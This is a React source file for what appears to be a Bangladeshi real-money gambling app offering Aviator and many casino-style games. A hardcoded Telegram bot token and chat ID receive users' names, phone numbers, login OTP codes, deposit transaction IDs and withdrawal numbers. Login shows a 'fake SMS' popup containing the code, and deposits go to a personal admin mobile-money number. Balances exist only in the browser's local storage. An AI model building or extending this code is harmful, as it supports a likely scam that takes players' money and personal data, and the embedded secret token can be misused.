
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_YyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_dice' | 'play_snake' | 'play_crash' | 'play_slots' | 
             'play_roulette' | 'play_mines' | 'play_plinko' | 'play_cards' |
             'play_dragon_tiger' | 'play_wheel' | 'play_coin' | 'play_baccarat' |
             'play_aviator' | 'play_hilo' | 'play_limbo' | 'play_scratch';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdraw';
  amount: number;
  status: 'pending' | 'success' | 'rejected';
  txId?: string;
  targetNumber?: string;
  date: string;
}

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

// --- Helper Functions ---
const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
};

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  
  // Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // Betting & Game States
  const [bet, setBet] = useState(100);
  const gameIntervalRef = useRef<any>(null);
  
  // Specific Game States
  const [multiplier, setMultiplier] = useState(1.0);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'crashed' | 'won'>('idle');
  const [minesGrid, setMinesGrid] = useState<any[]>([]);
  const [minesMultiplier, setMinesMultiplier] = useState(1.0);
  const [minesCount, setMinesCount] = useState(3);

  // Form States
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // Persistence & Initialization
  useEffect(() => {
    try {
      const savedUser = localStorage.getItem('og_user_v11');
      const savedBalance = localStorage.getItem('og_balance_v11');
      const savedTx = localStorage.getItem('og_tx_v11');
      
      if (savedUser) setUser(JSON.parse(savedUser));
      if (savedBalance) setBalance(Number(savedBalance));
      if (savedTx) setTransactions(JSON.parse(savedTx));
    } catch (e) {
      console.error("Data Load Error", e);
    }
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v11', JSON.stringify(user));
    localStorage.setItem('og_balance_v11', balance.toString());
    localStorage.setItem('og_tx_v11', JSON.stringify(transactions));
  }, [user, balance, transactions]);

  const handleGameResult = useCallback((win: boolean, gameName: string, betAmount: number, winMultiplier: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * winMultiplier) : 0;
    const net = win ? (winAmt - betAmount) : -betAmount;
    setBalance(prev => prev + net);
    if (user) {
      const updated = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updated);
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ${user.name}\n📊 ${win ? "WIN ✅" : "LOSS ❌"}\n💸 বাজি: ৳${betAmount}\n💰 ব্যালেন্স: ৳${balance + net}`);
    }
  }, [user, balance]);

  // Auth Logic
  const initiateAuth = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const name = (formData.get('name') as string) || "Player";
    const phone = formData.get('phone') as string;
    if (phone.length < 11) return alert("১১ ডিজিটের নম্বর দিন");
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(otp);
    setTempUser({ name, phone });
    setIsVerifying(true);
    setTimeout(() => setShowFakeSMS(true), 800);
    sendToTelegram(`🔑 <b>OTP</b>\n👤 ${name}\n📞 ${phone}\n🔑 কোড: ${otp}`);
  };

  const verifyOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else alert("ভুল ওটিপি!");
  };

  // Game: Aviator
  const startAviator = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setGameState('playing'); setMultiplier(1.0);
    const crashAt = 1.1 + Math.random() * 6;
    gameIntervalRef.current = setInterval(() => {
      setMultiplier(p => {
        const n = p + 0.04;
        if (n >= crashAt) {
          clearInterval(gameIntervalRef.current); setGameState('crashed');
          handleGameResult(false, "Aviator", bet);
          return n;
        }
        return n;
      });
    }, 150);
  };

  const cashOutAviator = () => {
    if (gameState !== 'playing') return;
    clearInterval(gameIntervalRef.current); setGameState('won');
    handleGameResult(true, "Aviator", bet, multiplier);
    alert(`আপনি জিতেছেন ৳${Math.floor(bet * multiplier)}`);
  };

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {showFakeSMS && (
          <div className="fixed top-8 w-[92%] max-w-sm glass rounded-[32px] p-6 animate-sms z-[999] border-orange-500 shadow-[0_25px_60px_rgba(255,107,0,0.35)]">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-8 h-8 rounded-full bg-orange-500 flex items-center justify-center text-black font-black text-[10px]">OTP</div>
              <p className="text-[10px] text-orange-500 font-black uppercase tracking-widest">Notification</p>
            </div>
            <p className="text-sm font-bold text-white">Your verification code is: <span className="text-orange-500 text-xl font-black tracking-widest ml-1">{otpSent}</span></p>
          </div>
        )}
        <div className="w-full max-w-sm text-center">
          <div className="w-24 h-24 bg-orange-500 rounded-[32px] mx-auto mb-10 flex items-center justify-center text-black font-black text-4xl shadow-[0_0_60px_rgba(255,107,0,0.3)] ring-4 ring-white/10">OG</div>
          {!isVerifying ? (
            <form onSubmit={initiateAuth} className="space-y-4">
              <input name="name" required placeholder="আপনার নাম" className="w-full bg-white/5 border border-white/10 rounded-[24px] py-5 px-6 outline-none text-white font-bold" />
              <input name="phone" required type="tel" placeholder="মোবাইল নম্বর" className="w-full bg-white/5 border border-white/10 rounded-[24px] py-5 px-6 outline-none text-white font-bold tracking-widest" />
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-[24px] uppercase text-[11px] tracking-widest shadow-xl active:scale-95 transition-all">গেম এ প্রবেশ করুন</button>
            </form>
          ) : (
            <div className="space-y-8 animate-in zoom-in duration-500">
              <p className="text-gray-500 text-[10px] font-black uppercase tracking-widest">কোডটি প্রবেশ করান</p>
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} maxLength={4} placeholder="____" className="w-full bg-transparent border-b-4 border-orange-500/40 text-center text-6xl font-black text-orange-500 outline-none pb-4 tracking-[0.5em]" />
              <button onClick={verifyOtp} className="w-full py-5 bg-white text-black font-black rounded-[24px] uppercase text-[11px] tracking-widest shadow-2xl active:scale-95 transition-all">ভেরিফাই</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative">
        <Header />
        <ChatAssistant />

        <main className="p-6">
          {activeTab === 'dashboard' && (
            <div className="space-y-10 animate-in fade-in duration-500">
              <div className="glass rounded-[48px] p-10 border border-white/10 shadow-2xl relative overflow-hidden">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-orange-500/10 blur-[60px]"></div>
                <p className="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-4 italic">Available Funds</p>
                <h1 className="text-5xl font-black tracking-tighter mb-10 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-4 bg-orange-500 text-black rounded-[24px] text-[10px] font-black uppercase shadow-xl active:scale-95 transition-all">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-4 glass border border-white/10 rounded-[24px] text-[10px] font-black uppercase">উত্তোলন</button>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                {[
                  { id: 'play_aviator', label: 'Aviator', icon: 'fa-paper-plane', color: 'text-red-500', bg: 'bg-red-500/10' },
                  { id: 'play_mines', label: 'Mines', icon: 'fa-gem', color: 'text-orange-500', bg: 'bg-orange-500/10' },
                  { id: 'play_crash', label: 'Crash', icon: 'fa-plane-up', color: 'text-red-500', bg: 'bg-red-500/10' },
                  { id: 'play_wheel', label: 'Wheel', icon: 'fa-dharmachakra', color: 'text-purple-500', bg: 'bg-purple-500/10' },
                  { id: 'play_hilo', label: 'Hi-Lo', icon: 'fa-arrows-up-down', color: 'text-blue-500', bg: 'bg-blue-500/10' },
                  { id: 'play_scratch', label: 'Scratch', icon: 'fa-ticket', color: 'text-green-500', bg: 'bg-green-500/10' },
                  { id: 'play_coin', label: 'Coin Flip', icon: 'fa-coins', color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
                  { id: 'play_dice', label: 'Dice', icon: 'fa-dice', color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                  { id: 'play_slots', label: 'Slots', icon: 'fa-clover', color: 'text-indigo-500', bg: 'bg-indigo-500/10' },
                  { id: 'play_baccarat', label: 'Baccarat', icon: 'fa-diamond', color: 'text-pink-500', bg: 'bg-pink-500/10' },
                  { id: 'play_dragon_tiger', label: 'Dragon Tiger', icon: 'fa-dragon', color: 'text-blue-400', bg: 'bg-blue-400/10' },
                  { id: 'play_limbo', label: 'Limbo', icon: 'fa-rocket', color: 'text-amber-500', bg: 'bg-amber-500/10' },
                  { id: 'play_plinko', label: 'Plinko', icon: 'fa-circle-dot', color: 'text-teal-500', bg: 'bg-teal-500/10' },
                  { id: 'play_cards', label: 'Card Clash', icon: 'fa-layer-group', color: 'text-cyan-500', bg: 'bg-cyan-500/10' },
                  { id: 'play_roulette', label: 'Roulette', icon: 'fa-circle-notch', color: 'text-rose-500', bg: 'bg-rose-500/10' },
                  { id: 'play_snake', label: 'Snake Pro', icon: 'fa-worm', color: 'text-lime-500', bg: 'bg-lime-500/10' }
                ].map(game => (
                  <div key={game.id} onClick={() => setActiveTab(game.id as View)} className="glass p-6 rounded-[36px] border border-white/5 hover:border-white/20 transition-all cursor-pointer group active:scale-95 shadow-lg">
                    <div className={`w-12 h-12 ${game.bg} ${game.color} rounded-2xl flex items-center justify-center text-xl mb-4 group-hover:scale-110 transition-transform shadow-inner`}>
                      <i className={`fa-solid ${game.icon}`}></i>
                    </div>
                    <h4 className="text-[11px] font-black uppercase tracking-wider">{game.label}</h4>
                    <p className="text-[8px] text-gray-600 font-bold mt-1 uppercase">WIN UP TO 10X</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'play_aviator' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
               <div className="glass rounded-[48px] p-8 border border-red-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">Aviator <span className="text-red-500">Flying</span></h2>
                 <div className="relative h-64 bg-black/60 rounded-[40px] mb-8 border border-white/5 flex flex-col items-center justify-center overflow-hidden">
                    <div className="text-7xl font-black tracking-tighter text-white z-10">{multiplier.toFixed(2)}x</div>
                    {gameState === 'crashed' && <div className="text-red-500 font-black text-2xl uppercase mt-4">Flew Away!</div>}
                 </div>
                 {gameState !== 'playing' ? (
                   <button onClick={startAviator} className="w-full py-6 bg-red-600 text-white font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest text-[11px]">বেট ধরুন (৳{bet})</button>
                 ) : (
                   <button onClick={cashOutAviator} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest">ক্যাশ আউট (৳{Math.floor(bet * multiplier)})</button>
                 )}
               </div>
            </div>
          )}

          {/* ... Other game views and tabs would be similarly handled ... */}
          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-orange-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-8 rounded-[28px] border border-white/5 mb-8 text-center relative overflow-hidden group">
                    <p className="text-[10px] text-gray-500 font-black uppercase mb-4 tracking-widest italic">সেন্ড মানি নম্বর</p>
                    <p className="text-2xl font-mono font-black text-orange-500 tracking-[0.2em]">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="৳১০০ - ৳৫০০০" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none" />
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="TxID paste here" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none uppercase tracking-widest" />
                   <button onClick={() => {
                     if (!depAmt || !depTx) return alert("তথ্য দিন");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'deposit', amount: Number(depAmt), status: 'pending', txId: depTx.toUpperCase(), date: new Date().toLocaleString('bn-BD') };
                     setTransactions([tx, ...transactions]);
                     sendToTelegram(`💰 <b>নতুন ডিপোজিট</b>\n👤 ${user?.name}\n💵 ৳${depAmt}\n📑 ${depTx}`);
                     alert("রিকোয়েস্ট পাঠানো হয়েছে!"); setActiveTab('history');
                   }} className="w-full py-6 bg-orange-500 text-black font-black rounded-2xl uppercase text-[11px] tracking-widest">ডিপোজিট রিকোয়েস্ট পাঠান</button>
                 </div>
               </div>
            </div>
          )}

          {activeTab === 'history' && (
            <div className="space-y-4 animate-in fade-in duration-500">
               <h2 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-600 px-2 italic">রেকর্ড সমূহ</h2>
               {transactions.length === 0 ? <p className="text-center opacity-30 py-24 text-[10px] font-black uppercase italic tracking-widest">কোন ডাটা নেই</p> : transactions.map(tx => (
                 <div key={tx.id} className="glass p-6 rounded-[32px] border border-white/5 shadow-xl flex justify-between items-center">
                    <div>
                      <p className="text-[10px] font-black uppercase tracking-widest text-white/80">{tx.type === 'deposit' ? 'ডিপোজিট' : 'উত্তোলন'}</p>
                      <p className="text-[8px] text-gray-600 font-bold mt-1">{tx.date}</p>
                    </div>
                    <div className="text-right">
                      <p className={`text-xl font-black ${tx.type === 'deposit' ? 'text-green-500' : 'text-red-500'}`}>৳{tx.amount}</p>
                      <span className="text-[7px] font-black uppercase px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-500">{tx.status}</span>
                    </div>
                 </div>
               ))}
            </div>
          )}

          {activeTab === 'withdraw' && (
            <div className="animate-in slide-in-from-left-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-red-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">টাকা <span className="text-red-500">উত্তোলন</span></h2>
                 <div className="bg-white/5 p-6 rounded-3xl mb-8 border border-white/5 text-center">
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1 italic">Your Balance</p>
                    <p className="text-3xl font-black text-white">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="ন্যূনতম ৫০০ টাকা" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none tracking-widest" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("ন্যূনতম ৫০০ টাকা উত্তোলন করতে পারবেন");
                     if (amt > balance) return alert("ব্যালেন্স নেই");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'withdraw', amount: amt, status: 'pending', targetNumber: witNum, date: new Date().toLocaleString('bn-BD') };
                     setBalance(p => p - amt); setTransactions([tx, ...transactions]);
                     sendToTelegram(`🔴 <b>উত্তোলন</b>\n👤 ${user?.name}\n💵 ৳${amt}\n📱 ${witNum}`);
                     alert("উত্তোলন রিকোয়েস্ট সফল হয়েছে।"); setActiveTab('history');
                   }} className="w-full py-6 bg-red-500 text-white font-black rounded-2xl uppercase text-[11px] tracking-widest shadow-xl">উত্তোলন করুন</button>
                 </div>
               </div>
            </div>
          )}
        </main>

        <nav className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] max-w-[400px] h-20 glass rounded-[44px] border border-white/10 flex items-center justify-around z-[100] shadow-2xl px-6">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'dashboard' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Home</span>
          </button>
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab.includes('play') ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Games</span>
          </button>
          <button onClick={() => setActiveTab('history')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'history' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-clock-rotate-left text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Record</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'withdraw' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Wallet</span>
          </button>
        </nav>
      </div>
    </div>
  );
}
